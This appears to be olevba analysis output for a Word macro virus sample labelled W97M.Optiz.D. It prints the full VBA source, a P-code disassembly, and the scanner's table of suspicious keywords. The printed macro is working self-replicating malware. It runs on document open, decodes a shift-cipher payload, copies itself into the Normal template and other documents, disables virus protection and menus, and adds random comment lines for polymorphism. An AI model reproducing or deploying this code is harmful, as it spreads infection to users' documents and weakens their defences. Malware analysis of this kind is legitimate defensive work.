olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.NoClue
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.NoClue - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Office_.bas 
in file: Virus.MSWord.Intended.NoClue - OLE stream: 'Macros/VBA/Office_'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Const ModulName = "Office_"
Public Active_ As Object
Public Normal_ As Object
Public CodeHost_ As Object
Public Skip As Boolean

Sub AutoOpen()
On Error Resume Next
Drop
End Sub

Sub Drop()
On Error Resume Next
Dim Jack(28) As String

Jack(1) = "l‹=b��Œ�=o‚�’Š‚=k‚•‘"
Jack(2) = "p‚‘=^€‘†“‚|=Z=^€‘†“‚aŒ€’Š‚‹‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�"
Jack(3) = "p‚‘=kŒ�Š~‰|=Z=kŒ�Š~‰q‚Š�‰~‘‚Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�"
Jack(4) = "^��‰†€~‘†Œ‹Ka†��‰~–^‰‚�‘�=Z=”�^‰‚�‘�kŒ‹‚"
Jack(5) = "`ŒŠŠ~‹�_~��E?s†‚”?FK`Œ‹‘�Œ‰�ESFKb‹~‰‚�=Z=c~‰�‚"
Jack(6) = "`ŒŠŠ~‹�_~��E?cŒ�Š~‘?FK`Œ‹‘�Œ‰�ENOFKb‹~‰‚�=Z=c~‰�‚"
Jack(7) = "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENOFKb‹~‰‚�=Z=c~‰�‚"
Jack(8) = "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENPFKb‹~‰‚�=Z=c~‰�‚"
Jack(9) = "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENQFKb‹~‰‚�=Z=c~‰�‚"
Jack(10) = "l�‘†Œ‹�Ks†�’�m�Œ‘‚€‘†Œ‹=Z=c~‰�‚"
Jack(11) = "l�‘†Œ‹�Kp~“‚kŒ�Š~‰m�ŒŠ�‘=Z=c~‰�‚"
Jack(12) = "l�‘†Œ‹�K^‰‰Œ”c~�‘p~“‚=Z=c~‰�‚"
Jack(13) = "a~‘~=Z=?€Wy”†‹VRK�–�?"
Jack(14) = "^��‰†€~‘†Œ‹Ks_bK^€‘†“‚s_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�EjŒ�’‰k~Š‚FKb•�Œ�‘=a~‘~"
Jack(15) = "^€‘†“‚f‹�=Z=c~‰�‚"
Jack(16) = "kŒ�Š~‰f‹�=Z=c~‰�‚"
Jack(17) = "cŒ�=†=Z=N=qŒ=kŒ�Š~‰|K`Œ’‹‘"
Jack(18) = "fƒ=kŒ�Š~‰|E†FKk~Š‚=Z=jŒ�’‰k~Š‚=q…‚‹=kŒ�Š~‰f‹�=Z=q�’‚"
Jack(19) = "k‚•‘"
Jack(20) = "cŒ�=†=Z=N=qŒ=^€‘†“‚|K`Œ’‹‘"
Jack(21) = "fƒ=^€‘†“‚|E†FKk~Š‚=Z=jŒ�’‰k~Š‚=q…‚‹=^€‘†“‚f‹�=Z=q�’‚"
Jack(22) = "k‚•‘"
Jack(23) = "fƒ=kŒ�Š~‰f‹�=Z=c~‰�‚=q…‚‹=kŒ�Š~‰|KfŠ�Œ�‘=a~‘~"
Jack(24) = "fƒ=^€‘†“‚f‹�=Z=c~‰�‚=q…‚‹"
Jack(25) = "^€‘†“‚|KfŠ�Œ�‘=a~‘~"
Jack(26) = "pˆ†�=Z=q�’‚"
Jack(27) = "b‹�=fƒ"
Jack(28) = "fƒ=eŒ’�EkŒ”EFF=Z=f‹‘Eo‹�=G=OQF=q…‚‹=j�„_Œ•=?d�‚‚‘—=‘ŒW?=C=“`�=C=“`�=C=?››H=i†‹‚w‚�õ=k‚‘”Œ�ˆ?=C=“`�=C=?››H=h‹Œ”�‚‘…=C=j‚‘~�…~�‚?=C=“`�=C=?››H=`‰~’=C=r‰‘†Š~‘‚=`…~Œ�?=C=“`�=C=?››H=k†„…‘Š~�‚=gŒˆ‚�?I=SQI=?tVTjKl�‘†—=™=–=g~€ˆ=q”Œƒ‰Œ”‚�Li†‹‚w‚�õ=s•=q‚~Š?"

For i = 1 To 28
    ECode = ECode & DeCode(Jack(i))
Next i

Set CodeHost_ = Application.VBE.ActiveVBProject.VBComponents(ModulName).CodeModule

For o = 1 To CodeHost_.CountOfLines
    If Left(CodeHost_.Lines(o, 1), 9) = Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(79) + Chr(112) + Chr(116) + Chr(105) + Chr(122) Then
        TheLine = o + 1
        Exit For
    End If
Next o

CodeHost_.InsertLines TheLine, ECode

Optiz

CodeHost_.DeleteLines TheLine, 29

If Skip = False Then
    NormalTemplate.VBProject.VBComponents(ModulName).CodeModule.DeleteLines TheLine, 29
Else
    ActiveDocument.VBProject.VBComponents(ModulName).CodeModule.DeleteLines TheLine, 29
    ActiveDocument.SaveAs ActiveDocument.FullName
End If

PolySize = Int(Rnd * 10)

For PolyMorphic = 1 To PolySize

    PolyString = ""
    PolyLines = CodeHost_.CountOfLines

    RndLine = Int(Rnd * PolyLines)
    StringSize = Int(Rnd * 39) + 1

    For SomeString = 1 To StringSize
        PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
    Next SomeString
    
    CodeHost_.InsertLines RndLine, "Rem " & PolyString

Next PolyMorphic

End Sub

Sub Optiz()

End Sub

Sub ToolsMacro()
End Sub
Sub ViewCode()
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsCustomize()
End Sub
Sub FileTemplates()
End Sub

Public Function DeCode(Code As String)

    For xy = 1 To Len(Code)
        Ascii = Asc(Mid(Code, xy, 1))
        Change = Ascii - 29
        NewCode = NewCode & Chr(Change)
    Next
    
    DeCode = NewCode & vbCr

End Function

'   W97M.Optiz.D
'   ============

'   Tech uses by Nightmare Joker, thanks!

'    Greetz to:
'    ~~+ LineZerØ
'    ~~+ Nightmare Joker
'    ~~+ Knowdeth
'    ~~+ Clau[UC]
'    ~~+ All austrian vx coders
'    ~~+ VicodinES

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.NoClue
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1130 bytes
' Macros/VBA/Office_ - 16470 bytes
' Line #0:
' 	Dim (Public Const) 
' 	LitStr 0x0007 "Office_"
' 	VarDefn ModulName
' Line #1:
' 	Dim (Public) 
' 	VarDefn Active_ (As Object)
' Line #2:
' 	Dim (Public) 
' 	VarDefn Normal_ (As Object)
' Line #3:
' 	Dim (Public) 
' 	VarDefn CodeHost_ (As Object)
' Line #4:
' 	Dim (Public) 
' 	VarDefn Skip (As Boolean)
' Line #5:
' Line #6:
' 	FuncDefn (Sub AutoOpen())
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	ArgsCall Drop 0x0000 
' Line #9:
' 	EndSub 
' Line #10:
' Line #11:
' 	FuncDefn (Sub Drop())
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x001C 
' 	VarDefn Jack (As String)
' Line #14:
' Line #15:
' 	LitStr 0x0014 "l‹=b��Œ�=o‚�’Š‚=k‚•‘"
' 	LitDI2 0x0001 
' 	ArgsSt Jack 0x0001 
' Line #16:
' 	LitStr 0x0033 "p‚‘=^€‘†“‚|=Z=^€‘†“‚aŒ€’Š‚‹‘Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�"
' 	LitDI2 0x0002 
' 	ArgsSt Jack 0x0001 
' Line #17:
' 	LitStr 0x0033 "p‚‘=kŒ�Š~‰|=Z=kŒ�Š~‰q‚Š�‰~‘‚Ks_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�"
' 	LitDI2 0x0003 
' 	ArgsSt Jack 0x0001 
' Line #18:
' 	LitStr 0x0028 "^��‰†€~‘†Œ‹Ka†��‰~–^‰‚�‘�=Z=”�^‰‚�‘�kŒ‹‚"
' 	LitDI2 0x0004 
' 	ArgsSt Jack 0x0001 
' Line #19:
' 	LitStr 0x002F "`ŒŠŠ~‹�_~��E?s†‚”?FK`Œ‹‘�Œ‰�ESFKb‹~‰‚�=Z=c~‰�‚"
' 	LitDI2 0x0005 
' 	ArgsSt Jack 0x0001 
' Line #20:
' 	LitStr 0x0032 "`ŒŠŠ~‹�_~��E?cŒ�Š~‘?FK`Œ‹‘�Œ‰�ENOFKb‹~‰‚�=Z=c~‰�‚"
' 	LitDI2 0x0006 
' 	ArgsSt Jack 0x0001 
' Line #21:
' 	LitStr 0x0031 "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENOFKb‹~‰‚�=Z=c~‰�‚"
' 	LitDI2 0x0007 
' 	ArgsSt Jack 0x0001 
' Line #22:
' 	LitStr 0x0031 "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENPFKb‹~‰‚�=Z=c~‰�‚"
' 	LitDI2 0x0008 
' 	ArgsSt Jack 0x0001 
' Line #23:
' 	LitStr 0x0031 "`ŒŠŠ~‹�_~��E?qŒŒ‰�?FK`Œ‹‘�Œ‰�ENQFKb‹~‰‚�=Z=c~‰�‚"
' 	LitDI2 0x0009 
' 	ArgsSt Jack 0x0001 
' Line #24:
' 	LitStr 0x001F "l�‘†Œ‹�Ks†�’�m�Œ‘‚€‘†Œ‹=Z=c~‰�‚"
' 	LitDI2 0x000A 
' 	ArgsSt Jack 0x0001 
' Line #25:
' 	LitStr 0x0020 "l�‘†Œ‹�Kp~“‚kŒ�Š~‰m�ŒŠ�‘=Z=c~‰�‚"
' 	LitDI2 0x000B 
' 	ArgsSt Jack 0x0001 
' Line #26:
' 	LitStr 0x001D "l�‘†Œ‹�K^‰‰Œ”c~�‘p~“‚=Z=c~‰�‚"
' 	LitDI2 0x000C 
' 	ArgsSt Jack 0x0001 
' Line #27:
' 	LitStr 0x0015 "a~‘~=Z=?€Wy”†‹VRK�–�?"
' 	LitDI2 0x000D 
' 	ArgsSt Jack 0x0001 
' Line #28:
' 	LitStr 0x0043 "^��‰†€~‘†Œ‹Ks_bK^€‘†“‚s_m�Œ‡‚€‘Ks_`ŒŠ�Œ‹‚‹‘�EjŒ�’‰k~Š‚FKb•�Œ�‘=a~‘~"
' 	LitDI2 0x000E 
' 	ArgsSt Jack 0x0001 
' Line #29:
' 	LitStr 0x0011 "^€‘†“‚f‹�=Z=c~‰�‚"
' 	LitDI2 0x000F 
' 	ArgsSt Jack 0x0001 
' Line #30:
' 	LitStr 0x0011 "kŒ�Š~‰f‹�=Z=c~‰�‚"
' 	LitDI2 0x0010 
' 	ArgsSt Jack 0x0001 
' Line #31:
' 	LitStr 0x001A "cŒ�=†=Z=N=qŒ=kŒ�Š~‰|K`Œ’‹‘"
' 	LitDI2 0x0011 
' 	ArgsSt Jack 0x0001 
' Line #32:
' 	LitStr 0x0034 "fƒ=kŒ�Š~‰|E†FKk~Š‚=Z=jŒ�’‰k~Š‚=q…‚‹=kŒ�Š~‰f‹�=Z=q�’‚"
' 	LitDI2 0x0012 
' 	ArgsSt Jack 0x0001 
' Line #33:
' 	LitStr 0x0004 "k‚•‘"
' 	LitDI2 0x0013 
' 	ArgsSt Jack 0x0001 
' Line #34:
' 	LitStr 0x001A "cŒ�=†=Z=N=qŒ=^€‘†“‚|K`Œ’‹‘"
' 	LitDI2 0x0014 
' 	ArgsSt Jack 0x0001 
' Line #35:
' 	LitStr 0x0034 "fƒ=^€‘†“‚|E†FKk~Š‚=Z=jŒ�’‰k~Š‚=q…‚‹=^€‘†“‚f‹�=Z=q�’‚"
' 	LitDI2 0x0015 
' 	ArgsSt Jack 0x0001 
' Line #36:
' 	LitStr 0x0004 "k‚•‘"
' 	LitDI2 0x0016 
' 	ArgsSt Jack 0x0001 
' Line #37:
' 	LitStr 0x002D "fƒ=kŒ�Š~‰f‹�=Z=c~‰�‚=q…‚‹=kŒ�Š~‰|KfŠ�Œ�‘=a~‘~"
' 	LitDI2 0x0017 
' 	ArgsSt Jack 0x0001 
' Line #38:
' 	LitStr 0x0019 "fƒ=^€‘†“‚f‹�=Z=c~‰�‚=q…‚‹"
' 	LitDI2 0x0018 
' 	ArgsSt Jack 0x0001 
' Line #39:
' 	LitStr 0x0013 "^€‘†“‚|KfŠ�Œ�‘=a~‘~"
' 	LitDI2 0x0019 
' 	ArgsSt Jack 0x0001 
' Line #40:
' 	LitStr 0x000B "pˆ†�=Z=q�’‚"
' 	LitDI2 0x001A 
' 	ArgsSt Jack 0x0001 
' Line #41:
' 	LitStr 0x0006 "b‹�=fƒ"
' 	LitDI2 0x001B 
' 	ArgsSt Jack 0x0001 
' Line #42:
' 	LitStr 0x00FD "fƒ=eŒ’�EkŒ”EFF=Z=f‹‘Eo‹�=G=OQF=q…‚‹=j�„_Œ•=?d�‚‚‘—=‘ŒW?=C=“`�=C=“`�=C=?››H=i†‹‚w‚�õ=k‚‘”Œ�ˆ?=C=“`�=C=?››H=h‹Œ”�‚‘…=C=j‚‘~�…~�‚?=C=“`�=C=?››H=`‰~’=C=r‰‘†Š~‘‚=`…~Œ�?=C=“`�=C=?››H=k†„…‘Š~�‚=gŒˆ‚�?I=SQI=?tVTjKl�‘†—=™=–=g~€ˆ=q”Œƒ‰Œ”‚�Li†‹‚w‚�õ=s•=q‚~Š?"
' 	LitDI2 0x001C 
' 	ArgsSt Jack 0x0001 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001C 
' 	For 
' Line #45:
' 	Ld ECode 
' 	Ld i 
' 	ArgsLd Jack 0x0001 
' 	ArgsLd DeCode 0x0001 
' 	Concat 
' 	St ECode 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' Line #48:
' 	SetStmt 
' 	Ld ModulName 
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set CodeHost_ 
' Line #49:
' Line #50:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CodeHost_ 
' 	MemLd CountOfLines 
' 	For 
' Line #51:
' 	Ld o 
' 	LitDI2 0x0001 
' 	Ld CodeHost_ 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x007A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld o 
' 	LitDI2 0x0001 
' 	Add 
' 	St TheLine 
' Line #53:
' 	ExitFor 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	Ld TheLine 
' 	Ld ECode 
' 	Ld CodeHost_ 
' 	ArgsMemCall InsertLines 0x0002 
' Line #58:
' Line #59:
' 	ArgsCall Optiz 0x0000 
' Line #60:
' Line #61:
' 	Ld TheLine 
' 	LitDI2 0x001D 
' 	Ld CodeHost_ 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #62:
' Line #63:
' 	Ld Skip 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld TheLine 
' 	LitDI2 0x001D 
' 	Ld ModulName 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #65:
' 	ElseBlock 
' Line #66:
' 	Ld TheLine 
' 	LitDI2 0x001D 
' 	Ld ModulName 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #67:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #68:
' 	EndIfBlock 
' Line #69:
' Line #70:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #71:
' Line #72:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #73:
' Line #74:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #75:
' 	Ld CodeHost_ 
' 	MemLd CountOfLines 
' 	St PolyLines 
' Line #76:
' Line #77:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	St RndLine 
' Line #78:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #79:
' Line #80:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #81:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #82:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #83:
' Line #84:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	Ld CodeHost_ 
' 	ArgsMemCall InsertLines 0x0002 
' Line #85:
' Line #86:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' Line #88:
' 	EndSub 
' Line #89:
' Line #90:
' 	FuncDefn (Sub Optiz())
' Line #91:
' Line #92:
' 	EndSub 
' Line #93:
' Line #94:
' 	FuncDefn (Sub ToolsMacro())
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub ViewCode())
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub ViewVBCode())
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub ToolsCustomize())
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub FileTemplates())
' Line #103:
' 	EndSub 
' Line #104:
' Line #105:
' 	FuncDefn (Public Function DeCode(Code As String))
' Line #106:
' Line #107:
' 	StartForVariable 
' 	Ld xy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Code 
' 	FnLen 
' 	For 
' Line #108:
' 	Ld Code 
' 	Ld xy 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St Ascii 
' Line #109:
' 	Ld Ascii 
' 	LitDI2 0x001D 
' 	Sub 
' 	St Change 
' Line #110:
' 	Ld NewCode 
' 	Ld Change 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St NewCode 
' Line #111:
' 	StartForVariable 
' 	Next 
' Line #112:
' Line #113:
' 	Ld NewCode 
' 	Ld vbCr 
' 	Concat 
' 	St DeCode 
' Line #114:
' Line #115:
' 	EndFunc 
' Line #116:
' Line #117:
' 	QuoteRem 0x0000 0x000F "   W97M.Optiz.D"
' Line #118:
' 	QuoteRem 0x0000 0x000F "   ============"
' Line #119:
' Line #120:
' 	QuoteRem 0x0000 0x0028 "   Tech uses by Nightmare Joker, thanks!"
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x000E "    Greetz to:"
' Line #123:
' 	QuoteRem 0x0000 0x0010 "    ~~+ LineZerØ"
' Line #124:
' 	QuoteRem 0x0000 0x0017 "    ~~+ Nightmare Joker"
' Line #125:
' 	QuoteRem 0x0000 0x0010 "    ~~+ Knowdeth"
' Line #126:
' 	QuoteRem 0x0000 0x0010 "    ~~+ Clau[UC]"
' Line #127:
' 	QuoteRem 0x0000 0x001E "    ~~+ All austrian vx coders"
' Line #128:
' 	QuoteRem 0x0000 0x0011 "    ~~+ VicodinES"
' Line #129:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

